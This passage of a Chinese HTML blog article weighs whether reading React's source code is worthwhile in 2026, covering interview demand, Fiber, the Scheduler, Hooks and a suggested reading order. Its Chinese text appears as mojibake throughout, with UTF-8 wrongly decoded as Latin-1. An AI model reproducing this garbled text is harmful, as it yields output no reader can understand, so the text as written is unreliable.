å¹´è¿™ä¸ªæ—¶é—´èŠ‚ç‚¹ï¼Œå¾ˆå¤šå¼€å‘è€…éƒ½åœ¨æ€è€ƒä¸€ä¸ªé—®é¢˜ï¼šReact æºç è¿˜å€¼ä¸å€¼å¾—æ·±å…¥é˜…è¯»ï¼Ÿ</p>
<p>è¿™ä¸ªé—®é¢˜çš„ç­”æ¡ˆå¹¶ä¸æ˜¯ç®€å•çš„"æ˜¯"æˆ–"å¦"ï¼Œè€Œéœ€è¦ä»å¤šä¸ªç»´åº¦è¿›è¡Œåˆ†æã€‚æœ¬æ–‡å°†ä»å®é™…ä»·å€¼ã€å­¦ä¹ æˆæœ¬ã€æŠ€æœ¯è¶‹åŠ¿ç­‰è§’åº¦ï¼Œä¸ºä½ æä¾›ä¸€ä¸ªå…¨é¢çš„åˆ†æã€‚</p>
<h2 data-id="heading-0">ä¸ºä»€ä¹ˆæ›¾ç»å€¼å¾—è¯» React æºç ï¼Ÿ</h2>
<p>åœ¨è®¨è®º"ç°åœ¨æ˜¯å¦å€¼å¾—"ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆå›é¡¾ä¸€ä¸‹ä¸ºä»€ä¹ˆ React æºç æ›¾ç»è¢«è®¤ä¸ºæ˜¯å€¼å¾—å­¦ä¹ çš„ç»å…¸ã€‚</p>
<p>React å¼•å…¥äº†å¾ˆå¤šå¼€åˆ›æ€§çš„æ¦‚å¿µï¼šè™šæ‹Ÿ DOMï¼ˆVirtual DOMï¼‰è™½ç„¶ç°åœ¨å·²ä¸æ˜¯æ–°æ¦‚å¿µï¼Œä½†åœ¨å½“æ—¶æ˜¯ä¸€ä¸ªçªç ´ï¼›ç»„ä»¶åŒ–æ€æƒ³ç¡®ç«‹äº†å£°æ˜å¼ UI å¼€å‘èŒƒå¼ï¼›å•å‘æ•°æ®æµæˆä¸ºçŠ¶æ€ç®¡ç†çš„æœ€ä½³å®è·µï¼›Fiber æ¶æ„å®ç°äº†æ—¶é—´åˆ‡ç‰‡å’Œå¯ä¸­æ–­æ¸²æŸ“çš„åˆ›æ–°ã€‚</p>
<p>React çš„ä»£ç åº“ä»¥å…¶é«˜è´¨é‡è‘—ç§°ï¼šæ¸…æ™°çš„ä»£ç ç»„ç»‡å’Œæ¶æ„è®¾è®¡ã€å®Œå–„çš„æ³¨é‡Šå’Œæ–‡æ¡£ã€ä¸¥æ ¼çš„ç±»å‹æ£€æŸ¥ï¼ˆä½¿ç”¨ Flowï¼Œåæ¥è¿ç§»åˆ° TypeScriptï¼‰ã€ä¸°å¯Œçš„æµ‹è¯•è¦†ç›–ã€‚</p>
<p>é˜…è¯» React æºç å¯ä»¥å­¦åˆ°å¤§å‹å¼€æºé¡¹ç›®çš„ç»„ç»‡æ–¹å¼ã€æ€§èƒ½ä¼˜åŒ–çš„æ€è·¯å’ŒæŠ€å·§ã€å¤æ‚çŠ¶æ€ç®¡ç†çš„å®ç°æ–¹å¼ï¼Œä»¥åŠè®¾è®¡æ¨¡å¼å’Œæ¶æ„æ¨¡å¼çš„å®é™…åº”ç”¨ã€‚</p>
<h2 data-id="heading-1">2026 å¹´çš„æŠ€æœ¯ç¯å¢ƒå˜åŒ–</h2>
<p>åˆ°äº† 2026 å¹´ï¼ŒReact å·²ç»éå¸¸æˆç†Ÿï¼šAPI å·²ç»ç›¸å¯¹ç¨³å®šï¼Œé‡å¤§å˜æ›´å‡å°‘ï¼›æ ¸å¿ƒæ¦‚å¿µå·²ç»è¢«å¹¿æ³›ç†è§£å’Œåº”ç”¨ï¼›ç”Ÿæ€ç³»ç»Ÿå®Œå–„ï¼Œæœ€ä½³å®è·µæ˜ç¡®ã€‚</p>
<p>å‰ç«¯æŠ€æœ¯æ ˆå˜å¾—æ›´åŠ å¤šæ ·åŒ–ï¼šVue 3ã€Svelteã€Solid.js ç­‰æ¡†æ¶å„æœ‰ä¼˜åŠ¿ï¼›æœåŠ¡ç«¯æ¸²æŸ“æ¡†æ¶ï¼ˆNext.jsã€Remixã€Astroï¼‰çš„å…´èµ·ï¼›Web Components çš„æ ‡å‡†åŒ–ï¼›ç¼–è¯‘æ—¶ä¼˜åŒ–æˆä¸ºè¶‹åŠ¿ï¼ˆå¦‚ React Compilerï¼‰ã€‚</p>
<p>å­¦ä¹ èµ„æºä¹Ÿå˜å¾—æ›´åŠ ä¸°å¯Œï¼šå¤§é‡çš„æ•™ç¨‹ã€è§†é¢‘ã€æ–‡ç« ï¼›å®˜æ–¹æ–‡æ¡£çš„å®Œå–„ï¼›ç¤¾åŒºç»éªŒçš„æ²‰æ·€ï¼›AI è¾…åŠ©å­¦ä¹ å·¥å…·çš„æ™®åŠã€‚</p>
<h2 data-id="heading-2">2026 å¹´è¯» React æºç çš„åˆ©å¼Šåˆ†æ</h2>
<h3 data-id="heading-3">ä»ç„¶å€¼å¾—è¯»çš„ç†ç”±</h3>
<p>è™½ç„¶ä½ å¯ä»¥é€šè¿‡æ–‡æ¡£å’Œæ•™ç¨‹å­¦ä¼šå¦‚ä½•ä½¿ç”¨ Reactï¼Œä½†é˜…è¯»æºç èƒ½è®©ä½ çœŸæ­£ç†è§£ React çš„å·¥ä½œåŸç†ï¼Œè€Œä¸æ˜¯è¡¨é¢çš„ API ä½¿ç”¨ï¼›ç†è§£ä¸ºä»€ä¹ˆæŸäº› API æ˜¯è¿™æ ·è®¾è®¡çš„ï¼›ç†è§£æ€§èƒ½ä¼˜åŒ–çš„åº•å±‚åŸç†ï¼ˆå¦‚ Diff ç®—æ³•ã€Fiber è°ƒåº¦ï¼‰ã€‚</p>
<p>å½“ä½ é‡åˆ°æ¡†æ¶å±‚é¢çš„é—®é¢˜æ—¶ï¼Œæºç çŸ¥è¯†èƒ½å¸®åŠ©ä½ å¿«é€Ÿå®šä½é—®é¢˜æ ¹æºã€æ‰¾åˆ°ç»•è¿‡æ¡†æ¶é™åˆ¶çš„æ–¹æ³•ã€ä¸ºæ¡†æ¶è´¡çŒ®ä»£ç æˆ–å‚ä¸è®¨è®ºã€‚</p>
<p>ä»èŒä¸šå‘å±•è§’åº¦æ¥çœ‹ï¼Œæ·±å…¥ç†è§£ React æºç å¯ä»¥å±•ç°æŠ€æœ¯æ·±åº¦ã€å­¦ä¹ å¤§å‹é¡¹ç›®çš„æ¶æ„è®¾è®¡æ€è·¯ã€åŸ¹å…»é˜…è¯»å¤æ‚ä»£ç çš„èƒ½åŠ›ã€‚</p>
<p>é¢è¯•ä»ç„¶æ˜¯è¯»æºç çš„é‡è¦é©±åŠ¨åŠ›ã€‚æ‰“å¼€ç‰›å®¢ç½‘ç­‰é¢è¯•å¹³å°ï¼Œä½ ä¼šå‘ç° React æºç ç›¸å…³çš„é¢ç»ä¾ç„¶å¤§é‡å­˜åœ¨ã€‚å¤§å‚é¢è¯•ä¸­ï¼ŒReact æºç é—®é¢˜å‡ ä¹æ˜¯å¿…é—®é¡¹ï¼šFiber æ¶æ„çš„å®ç°åŸç†ã€Hooks çš„å·¥ä½œæœºåˆ¶ã€Diff ç®—æ³•çš„ä¼˜åŒ–ç­–ç•¥ã€äº‹ä»¶ç³»ç»Ÿçš„åˆæˆäº‹ä»¶æœºåˆ¶ã€è°ƒåº¦å™¨çš„ä¼˜å…ˆçº§è°ƒåº¦åŸç†ç­‰ç­‰ã€‚å¦‚æœä½ åªèƒ½å›ç­” API çš„ä½¿ç”¨ï¼Œè€Œæ— æ³•è§£é‡Šåº•å±‚çš„å®ç°åŸç†ï¼Œåœ¨é¢è¯•ä¸­å¾ˆéš¾è·å¾—ç«äº‰ä¼˜åŠ¿ã€‚ä¸ä»…ä»…æ˜¯ä¸­é«˜çº§å‰ç«¯å¼€å‘è€…çš„é¢è¯•ï¼Œå°±è¿ç§‹æ‹›å’Œå®ä¹ é¢è¯•ä¸­ä¹Ÿç»å¸¸å‡ºç° React æºç ç›¸å…³çš„é—®é¢˜ï¼Œæ·±å…¥ç†è§£ React æºç å‡ ä¹æˆäº†æ ‡é…è¦æ±‚ã€‚</p>
<p>åœ¨ AI å·¥å…·æ—¥ç›Šæ™®åŠçš„ 2026 å¹´ï¼Œä¸€ä¸ªç°å®æ˜¯ï¼šå³ä½¿ä½ ä¸æ‡‚ React åŸç†ï¼Œä¹Ÿèƒ½é€šè¿‡ AI è¾…åŠ©å·¥å…·ï¼ˆå¦‚ GitHub Copilotã€claude codeã€Cursor ç­‰ï¼‰å®Œæˆæ—¥å¸¸å¼€å‘å·¥ä½œã€‚AI å¯ä»¥å¸®åŠ©ä½ ç”Ÿæˆä»£ç ã€è§£å†³ bugã€ä¼˜åŒ–æ€§èƒ½ã€‚ä½†å¦‚æœä½ æƒ³è¦æ‰¾åˆ°ä¸€ä»½å¥½çš„å·¥ä½œï¼Œç‰¹åˆ«æ˜¯å¦‚æœä½ çš„æŠ€æœ¯æ ˆæ˜¯ Reactï¼Œé‚£ä¹ˆæœ€å¥½è¿˜æ˜¯æ·±å…¥ç†è§£ React åŸç†ã€‚åŸå› å¾ˆç®€å•ï¼šAI å¯ä»¥å¸®ä½ å†™ä»£ç ï¼Œä½†ä¸èƒ½å¸®ä½ é€šè¿‡æŠ€æœ¯é¢è¯•ï¼›AI å¯ä»¥è§£å†³å…·ä½“é—®é¢˜ï¼Œä½†ä¸èƒ½æ›¿ä»£ä½ å¯¹æ¡†æ¶çš„æ·±åº¦ç†è§£ã€‚åœ¨ç«äº‰æ¿€çƒˆçš„å°±ä¸šå¸‚åœºä¸­ï¼Œèƒ½å¤Ÿè§£é‡Š React åº•å±‚åŸç†çš„å¼€å‘è€…ï¼Œæ˜æ˜¾æ¯”åªä¼šä½¿ç”¨ API çš„å¼€å‘è€…æ›´æœ‰ä¼˜åŠ¿ã€‚</p>
<p>ä»¥ä¸‹æ˜¯ä»ç‰›å®¢ç½‘é¢ç»ä¸­æˆªå–çš„å®é™…é¢è¯•é¢˜ç›®ï¼Œå¯ä»¥çœ‹åˆ° React åŸç†ç±»é—®é¢˜ç¡®å®é¢‘ç¹å‡ºç°ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31c7e7fe065f48bb88a6d43795a549aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603201&amp;x-signature=kXP%2BW9KChvEIp0eDdOQdEeblCs4%3D" alt="ç‰›å®¢ç½‘ React é¢ç»æˆªå›¾ 1" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f3b850e68914dea80ea609435441d5f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603201&amp;x-signature=YWb%2FmKzuNVnNMohedweVGaW5v5U%3D" alt="ç‰›å®¢ç½‘ React é¢ç»æˆªå›¾ 2" loading="lazy"/></p>
<p>React 19 å¼•å…¥äº†å¾ˆå¤šæ–°ç‰¹æ€§ï¼Œå€¼å¾—æ·±å…¥ç ”ç©¶ï¼šå¹¶å‘æ¸²æŸ“ï¼ˆConcurrent Renderingï¼‰ã€è‡ªåŠ¨æ‰¹å¤„ç†ï¼ˆAutomatic Batchingï¼‰ã€Suspense çš„å®Œæ•´å®ç°ã€Transition APIã€React Compilerã€Actions å’Œ Form çš„æ”¹è¿›ç­‰ã€‚</p>
<p>React æºç æ˜¯å­¦ä¹ è®¾è®¡æ¨¡å¼çš„ç»ä½³æ•™æï¼šè§‚å¯Ÿè€…æ¨¡å¼ï¼ˆäº‹ä»¶ç³»ç»Ÿï¼‰ã€ç­–ç•¥æ¨¡å¼ï¼ˆè°ƒåº¦å™¨ï¼‰ã€é€‚é…å™¨æ¨¡å¼ï¼ˆå„ç§ rendererï¼‰ã€å·¥å‚æ¨¡å¼ï¼ˆç»„ä»¶åˆ›å»ºï¼‰ã€‚</p>
<h3 data-id="heading-4">å¯èƒ½ä¸å€¼å¾—è¯»çš„ç†ç”±</h3>
<p>React æºç åº“åºå¤§ï¼ˆè¶…è¿‡ 10 ä¸‡è¡Œä»£ç ï¼‰ï¼Œéœ€è¦å¤§é‡çš„æ—¶é—´å’Œç²¾åŠ›æŠ•å…¥ï¼Œå¯¹äºå¤§å¤šæ•°åº”ç”¨å¼€å‘åœºæ™¯ï¼Œå¯èƒ½"ç”¨ä¸åˆ°"è¿™ä¹ˆæ·±çš„çŸ¥è¯†ã€‚</p>
<p>å¦‚æœä½ å·²ç»æ˜¯ç»éªŒä¸°å¯Œçš„ React å¼€å‘è€…ï¼Œè¯»æºç çš„è¾¹é™…æ”¶ç›Šå¯èƒ½ä¸å¤§ï¼Œå¾ˆå¤šæ¦‚å¿µå·²ç»é€šè¿‡å…¶ä»–æ–¹å¼å­¦ä¹ åˆ°äº†ï¼Œå®é™…å·¥ä½œä¸­å¾ˆå°‘éœ€è¦æ·±å…¥åˆ°æ¡†æ¶å®ç°å±‚é¢ã€‚</p>
<p>å¦‚æœé¡¹ç›®ä½¿ç”¨äº†å…¶ä»–æ¡†æ¶ï¼ˆVueã€Svelte ç­‰ï¼‰ï¼ŒReact æºç çš„å­¦ä¹ ä»·å€¼ç›¸å¯¹é™ä½ï¼›å¦‚æœè½¬å‘äº†æœåŠ¡ç«¯æ¸²æŸ“æˆ–è¾¹ç¼˜è®¡ç®—ï¼Œå®¢æˆ·ç«¯æ¡†æ¶æºç çš„ä»·å€¼é™ä½ã€‚</p>
<p>ç°åœ¨æœ‰æ›´å¤šé«˜è´¨é‡çš„å­¦ä¹ èµ„æºï¼ˆè§†é¢‘æ•™ç¨‹ã€äº’åŠ¨å¼è¯¾ç¨‹ï¼‰ï¼Œå¯ä»¥é€šè¿‡æ„å»ºç®€åŒ–ç‰ˆ React æ¥å­¦ä¹ æ ¸å¿ƒæ¦‚å¿µï¼Œé€šè¿‡ TypeScript ç±»å‹å®šä¹‰ä¹Ÿèƒ½ç†è§£å¾ˆå¤šè®¾è®¡ã€‚</p>
<h2 data-id="heading-5">å¦‚ä½•åˆ¤æ–­ä½ æ˜¯å¦åº”è¯¥è¯» React æºç ï¼Ÿ</h2>
<p>é€‚åˆè¯»æºç çš„æƒ…å†µåŒ…æ‹¬ï¼šä½ å·²ç»ç†Ÿç»ƒä½¿ç”¨ React è¿›è¡Œå¼€å‘ï¼ˆè‡³å°‘ 1-2 å¹´ç»éªŒï¼‰ï¼›ä½ é‡åˆ°äº†æ¡†æ¶å±‚é¢çš„é—®é¢˜ï¼Œéœ€è¦æ·±å…¥ç†è§£æ‰èƒ½è§£å†³ï¼›ä½ æƒ³æå‡æŠ€æœ¯æ·±åº¦ï¼Œä¸ºèŒä¸šå‘å±•åšå‡†å¤‡ï¼›ä½ å³å°†å‚åŠ é¢è¯•ï¼Œæ— è®ºæ˜¯ç§‹æ‹›ã€å®ä¹ è¿˜æ˜¯ç¤¾æ‹›ï¼Œç‰¹åˆ«æ˜¯å¤§å‚é¢è¯•ï¼ŒReact æºç é—®é¢˜å‡ ä¹æ˜¯å¿…è€ƒç‚¹ï¼›ä½ å¯¹æ¡†æ¶è®¾è®¡æ„Ÿå…´è¶£ï¼Œæƒ³è¦å­¦ä¹ æ¶æ„è®¾è®¡ï¼›ä½ æƒ³è¦ä¸º React è´¡çŒ®ä»£ç ï¼Œæˆ–å‚ä¸ç›¸å…³æŠ€æœ¯è®¨è®ºï¼›ä½ æ˜¯å‰ç«¯æŠ€æœ¯ä¸“å®¶æˆ–æ¶æ„å¸ˆï¼Œéœ€è¦å…¨é¢çš„æŠ€æœ¯ç†è§£ã€‚</p>
<p>ä¸å¤ªé€‚åˆè¯»æºç çš„æƒ…å†µåŒ…æ‹¬ï¼šReact æ–°æ‰‹åº”è¯¥å…ˆæŒæ¡åŸºç¡€ä½¿ç”¨ï¼Œå†è€ƒè™‘è¯»æºç ï¼›æ—¶é—´æœ‰é™çš„æƒ…å†µä¸‹ï¼Œå¦‚æœé¡¹ç›®å‹åŠ›å¤§ï¼Œå…ˆä¿è¯ä¸šåŠ¡èƒ½åŠ›ï¼›å¦‚æœèŒä¸šæ–¹å‘ä¸åœ¨å‰ç«¯æ¡†æ¶ï¼Œå¦‚æœè½¬å‘å…¨æ ˆã€åç«¯æˆ–ç§»åŠ¨ç«¯ï¼Œä¼˜å…ˆçº§åº”è¯¥è°ƒæ•´ï¼›å¦‚æœåªåšä¸šåŠ¡å¼€å‘ï¼Œå·¥ä½œä¸­ä¸éœ€è¦æ·±å…¥åˆ°æ¡†æ¶å±‚é¢ï¼Œå¯èƒ½æ”¶ç›Šä¸å¤§ã€‚</p>
<h2 data-id="heading-6">å¦‚æœå†³å®šè¯»ï¼Œåº”è¯¥å¦‚ä½•è¯»ï¼Ÿ</h2>
<p>å¦‚æœä½ å†³å®šè¦è¯» React æºç ï¼Œä¸è¦è¯•å›¾ä¸€æ¬¡æ€§è¯»å®Œæ‰€æœ‰ä»£ç ï¼Œåº”è¯¥æŒ‰æ¨¡å—å­¦ä¹ ã€‚</p>
<p>ä¸‹é¢è¿™å¼ å›¾æ˜¯æˆ‘æ•´ç†çš„ React æºç æ•´ä½“é˜…è¯»æµç¨‹ï¼Œç”¨ä¸€æ¡æ¸…æ™°çš„è·¯å¾„æŠŠä» JSX åˆ° Fiberã€å†åˆ° Scheduler å’Œ commit é˜¶æ®µä¸²è”åœ¨ä¸€èµ·ã€‚å»ºè®®ä½ å…ˆæ•´ä½“çœ‹ä¸€éè¿™å¼ å›¾ï¼Œå¯¹ React å†…éƒ¨çš„æ‰§è¡Œé“¾è·¯æœ‰ä¸ªå…¨å±€è®¤çŸ¥ï¼Œå†æŒ‰å›¾ä¸­çš„é¡ºåºå»å¯¹åº”é˜…è¯»æºç é‡Œçš„å…³é”®éƒ¨åˆ†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/71d84a7c513344a18113e0ae2080cecd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603201&amp;x-signature=yyaaJY17qt9bFcedx0J6r1yEGoM%3D" alt="20260121200944" loading="lazy"/></p>
<p>ç»“åˆè¿™å¼ æµç¨‹å›¾ï¼Œå¯ä»¥æŒ‰ä¸‹é¢çš„é¡ºåºæ¥è¯» React æºç ï¼š</p>
<ol>
<li>
<p>ä»ä½¿ç”¨å…¥å£å‡ºå‘ï¼šå…ˆçœ‹ packages/react ä¸­ä¸ JSX ç›¸å…³çš„å®ç°ï¼ˆcreateElementã€jsx ç­‰ï¼‰ï¼Œå†çœ‹ packages/react-dom ä¸­çš„ createRootã€renderï¼Œå¼„æ¸…æ¥šä¸€æ¬¡æ¸²æŸ“æ˜¯å¦‚ä½•è¢«å‘èµ·çš„ã€‚</p>
</li>
<li>
<p>ç†è§£ Fiber æ•°æ®ç»“æ„ï¼šåœ¨ packages/react-reconciler ä¸­é˜…è¯» FiberNode çš„å®šä¹‰ã€createFiber ç­‰ä»£ç ï¼Œææ¸…æ¥š Fiber ä¸Šéƒ½æŒ‚äº†å“ªäº›ä¿¡æ¯ï¼Œä»¥åŠå®ƒå’Œæ›´æ–°é˜Ÿåˆ—çš„å…³ç³»ã€‚</p>
</li>
<li>
<p>çœ‹æ¸²æŸ“é˜¶æ®µçš„å·¥ä½œå¾ªç¯ï¼šç»§ç»­åœ¨ react-reconciler é‡Œçœ‹ workLoopConcurrentã€performUnitOfWorkã€beginWorkã€completeWorkï¼Œå¯¹åº”æµç¨‹å›¾ä¸­ã€Œæ¸²æŸ“é˜¶æ®µã€è¿™éƒ¨åˆ†ã€‚</p>
</li>
<li>
<p>å•ç‹¬å•ƒ Schedulerï¼šåˆ‡åˆ° packages/schedulerï¼Œç†è§£ä»»åŠ¡é˜Ÿåˆ—ã€ä¼˜å…ˆçº§å’Œæ—¶é—´åˆ‡ç‰‡æœºåˆ¶ï¼Œè¿™ä¸€å—å¯¹åº”æµç¨‹å›¾ä¸­é—´çš„è°ƒåº¦å™¨èŠ‚ç‚¹ã€‚</p>
</li>
<li>
<p>å›åˆ° commit é˜¶æ®µï¼šå†å›åˆ° react-reconcilerï¼Œçœ‹ commitRootã€commitMutationEffectsã€commitLayoutEffectsï¼Œå¼„æ¸…æ¥š DOM å®é™…åœ¨ä»€ä¹ˆæ—¶å€™ã€ä»¥ä»€ä¹ˆé¡ºåºè¢«æ›´æ–°ã€‚</p>
</li>
<li>
<p>æ·±å…¥ Hooks å®ç°ï¼šé‡ç‚¹é˜…è¯» useStateã€useReducerã€useEffect ç­‰ Hook å¯¹åº”çš„å®ç°æ–‡ä»¶ï¼Œç»“åˆ Hooks é“¾è¡¨çš„é‚£éƒ¨åˆ†æµç¨‹å›¾ï¼Œç†è§£ hooks é“¾è¡¨å¦‚ä½•åœ¨ currentã€workInProgress ä¹‹é—´åˆ‡æ¢ã€‚</p>
</li>
<li>
<p>æœ€åå†çœ‹ Contextã€Suspenseã€å¹¶å‘ç‰¹æ€§ç­‰æ¨¡å—ï¼ŒæŠŠå‰é¢æ‰“ä¸‹çš„åŸºç¡€æ‰©å±•æˆå®Œæ•´çš„ React å†…éƒ¨å¿ƒæ™ºæ¨¡å‹ã€‚</p>
</li>
</ol>
<p>å¦‚æœä½ æ—¶é—´ä¸å¤šï¼Œå»ºè®®ä¼˜å…ˆæŠŠ 1-6 è·‘é€šï¼šå…¥å£èƒ½ä¸²èµ·æ¥ã€Fiber èƒ½çœ‹æ‡‚ã€workLoop èƒ½è·Ÿä½ã€Scheduler æœ‰æ¦‚å¿µã€commit çŸ¥é“åœ¨å¹²å˜›ã€Hooks èƒ½è§£é‡Šæ¸…æ¥šï¼ŒåŸºæœ¬å°±å·²ç»å…·å¤‡â€œè¯»æ‡‚ React æºç â€çš„ä¸»å¹²èƒ½åŠ›ã€‚</p>
<p>å·¥å…·å’Œæ–¹æ³•ä¸Šï¼Œå»ºè®®å…ˆæŠŠ React æºç ä»“åº“æ‹‰åˆ°æœ¬åœ°ï¼Œåœ¨æºç é‡Œå®šä½å…³é”®å‡½æ•°å’Œå…³é”®æ•°æ®ç»“æ„ã€‚</p>
<p>åŒæ—¶æ­é… React DevTools è§‚å¯Ÿç»„ä»¶æ ‘å’ŒçŠ¶æ€å˜åŒ–ã€‚çœŸæ­£è°ƒè¯•è¿è¡Œæ—¶è·¯å¾„æ—¶ï¼Œæµè§ˆå™¨é‡Œæ‰§è¡Œçš„æ˜¯æ„å»ºåçš„ bundleï¼Œæ‰€ä»¥éœ€è¦å¼€å¯ Source Mapï¼ŒæŠŠæ–­ç‚¹ã€è°ƒç”¨æ ˆä» bundle æ˜ å°„å›ä½ æœ¬åœ°çš„æºç æ–‡ä»¶ï¼Œè¿™æ ·ä½ åœ¨ DevTools é‡Œè·Ÿä»£ç æ—¶çœ‹åˆ°çš„å°±æ˜¯ React æºç è€Œä¸æ˜¯ç¼–è¯‘äº§ç‰©ã€‚</p>
<p>é‡åˆ°æ•°æ®ç»“æ„æˆ–è¾¹ç•Œæ¡ä»¶ä¸ç¡®å®šï¼Œå†å¯¹ç…§å®˜æ–¹æ–‡æ¡£å’Œ TypeScript ç±»å‹å®šä¹‰å»æ ¡éªŒã€‚</p>
<p>æœ€åï¼Œè¾¹è¯»è¾¹åšä¸€ä¸ªâ€œæœ€å°å¯è¿è¡Œâ€çš„ç®€åŒ–ç‰ˆ Reactï¼Œå†ç”¨å°‘é‡æµ‹è¯•ç”¨ä¾‹éªŒè¯è‡ªå·±çš„æ¨å¯¼ï¼Œä¼šæ¯”çº¯è¯»æ›´å®¹æ˜“å½¢æˆç¨³å®šçš„å¿ƒæ™ºæ¨¡å‹ã€‚</p>
<h2 data-id="heading-7">2026 å¹´çš„æ–°è§†è§’ï¼šReact Compiler ä¸æœªæ¥</h2>
<p>åˆ°äº† 2026 å¹´ï¼ŒReact å¯èƒ½å·²ç»é›†æˆäº†ä¸€äº›æ–°ç‰¹æ€§ï¼Œå€¼å¾—å…³æ³¨ã€‚</p>
<p>å¦‚æœ React Compiler å·²ç»é›†æˆåˆ°æ ¸å¿ƒï¼Œè¿™å°†æ˜¯å€¼å¾—æ·±å…¥å­¦ä¹ çš„æ–°å†…å®¹ï¼šç¼–è¯‘æ—¶ä¼˜åŒ–çš„æ€è·¯ã€é™æ€åˆ†æå’Œä»£ç è½¬æ¢ã€æ€§èƒ½ä¼˜åŒ–çš„æ–°èŒƒå¼ã€‚</p>
<p>React 19 çš„å¹¶å‘ç‰¹æ€§å·²ç»ç¨³å®šï¼Œè¿™äº›å®ç°å€¼å¾—æ·±å…¥ç ”ç©¶ï¼šæ—¶é—´åˆ‡ç‰‡ï¼ˆTime Slicingï¼‰ã€ä¼˜å…ˆçº§è°ƒåº¦ã€å¯ä¸­æ–­æ¸²æŸ“ã€‚</p>
<p>äº†è§£ React å¦‚ä½•ä¸æ–°æŠ€æœ¯æ•´åˆä¹Ÿå¾ˆé‡è¦ï¼šReact Server Componentsã€ä¸ WebAssembly çš„äº¤äº’ã€ä¸ Web Workers çš„é›†æˆã€‚</p>
<h2 data-id="heading-8">æ›¿ä»£å­¦ä¹ è·¯å¾„</h2>
<p>å¦‚æœä½ è§‰å¾—è¯»å®Œæ•´æºç æˆæœ¬å¤ªé«˜ï¼Œå¯ä»¥è€ƒè™‘è¿™äº›æ›¿ä»£æ–¹æ¡ˆã€‚</p>
<p>é€šè¿‡å®ç°ä¸€ä¸ªç®€åŒ–ç‰ˆçš„ Reactï¼ˆå¦‚ 1000 è¡Œå·¦å³çš„ä»£ç ï¼‰ï¼Œä½ å¯ä»¥å­¦ä¹ åˆ°æ ¸å¿ƒæ¦‚å¿µï¼šVirtual DOMã€ç»„ä»¶ç³»ç»Ÿã€Diff ç®—æ³•ã€Hooks åŸºç¡€å®ç°ã€‚</p>
<p>åªè¯»æœ€æ ¸å¿ƒçš„éƒ¨åˆ†ï¼šReconciler çš„æ ¸å¿ƒé€»è¾‘ã€Hooks çš„å®ç°ã€Scheduler çš„è°ƒåº¦ç®—æ³•ã€‚</p>
<p>React çš„ TypeScript ç±»å‹å®šä¹‰æœ¬èº«å°±æ˜¯å¾ˆå¥½çš„æ–‡æ¡£ï¼Œå¯ä»¥å¸®ä½ ç†è§£ API è®¾è®¡æ€è·¯ã€æ•°æ®æµã€ç»„ä»¶ç”Ÿå‘½å‘¨æœŸã€‚</p>
<p>å…³æ³¨æŠ€æœ¯åšå®¢å’Œè§†é¢‘ï¼šReact å›¢é˜Ÿçš„å®˜æ–¹åšå®¢ã€æŠ€æœ¯ç¤¾åŒºçš„æ–‡ç« ã€æ·±åº¦è§£æè§†é¢‘ã€‚</p>
<h2 data-id="heading-9">ç»“è®ºä¸å»ºè®®</h2>
<p>åœ¨ 2026 å¹´ï¼ŒReact æºç ä»ç„¶å€¼å¾—è¯»ï¼Œä½†ä¸å†æ˜¯"å¿…è¯»é¡¹"ã€‚</p>
<p>å¯¹äºå¤§å¤šæ•°å¼€å‘è€…ï¼Œå»ºè®®ä¼˜å…ˆæŒæ¡ React çš„ä½¿ç”¨å’Œæœ€ä½³å®è·µï¼Œé€šè¿‡æ–‡æ¡£ã€æ•™ç¨‹å’Œé¡¹ç›®ç»éªŒæå‡èƒ½åŠ›ï¼Œåªåœ¨é‡åˆ°ç‰¹å®šé—®é¢˜æˆ–æƒ³æå‡æ·±åº¦æ—¶ï¼Œæœ‰é’ˆå¯¹æ€§åœ°é˜…è¯»ç›¸å…³æºç ã€‚</p>
<p>å¯¹äºæœ‰è¿½æ±‚çš„å¼€å‘è€…ï¼Œå¦‚æœä½ æœ‰æ—¶é—´å’Œå…´è¶£ï¼Œé˜…è¯»æºç ç»å¯¹æ˜¯æœ‰ä»·å€¼çš„æŠ•èµ„ã€‚å»ºè®®é‡‡ç”¨"é€‰æ‹©æ€§æ·±åº¦é˜…è¯»"çš„æ–¹å¼ï¼Œé‡ç‚¹å­¦ä¹ æ ¸å¿ƒæ¨¡å—ã€‚ç»“åˆå®è·µé¡¹ç›®ï¼Œé€šè¿‡æ„å»ºç®€åŒ–ç‰ˆæ¥åŠ æ·±ç†è§£ã€‚</p>
<p>å¯¹äºæŠ€æœ¯ä¸“å®¶å’Œæ¶æ„å¸ˆï¼Œæ·±å…¥ç†è§£ React æºç æ˜¯å¿…è¦çš„ã€‚è¿™ä¸ä»…èƒ½å¸®ä½ åšå‡ºæ›´å¥½çš„æŠ€æœ¯å†³ç­–ï¼Œè¿˜èƒ½æå‡æ¶æ„è®¾è®¡èƒ½åŠ›ã€‚</p>
<p>æŠ€æœ¯å­¦ä¹ æ˜¯ä¸€ä¸ªæŒç»­çš„è¿‡ç¨‹ï¼Œä¸åº”è¯¥æœ‰"ä¸€åŠ³æ°¸é€¸"çš„æƒ³æ³•ã€‚æ˜¯å¦è¯» React æºç ï¼Œåº”è¯¥åŸºäºä½ çš„å½“å‰æ°´å¹³ã€èŒä¸šç›®æ ‡ã€é¡¹ç›®éœ€æ±‚ã€æ—¶é—´èµ„æºã€‚</p>
<p>åœ¨ 2026 å¹´ï¼Œæˆ‘ä»¬æœ‰æ›´å¤šçš„å­¦ä¹ é€‰æ‹©ã€‚React æºç ä»ç„¶æ˜¯å®è´µçš„å­¦ä¹ èµ„æºï¼Œä½†å®ƒä¸å†æ˜¯å”¯ä¸€çš„é€‰æ‹©ã€‚é€‰æ‹©æœ€é€‚åˆä½ å½“å‰æƒ…å†µçš„è·¯å¾„ï¼Œæ¯”ç›²ç›®è¿½æ±‚"è¯»å®Œæºç "æ›´é‡è¦ã€‚</p>
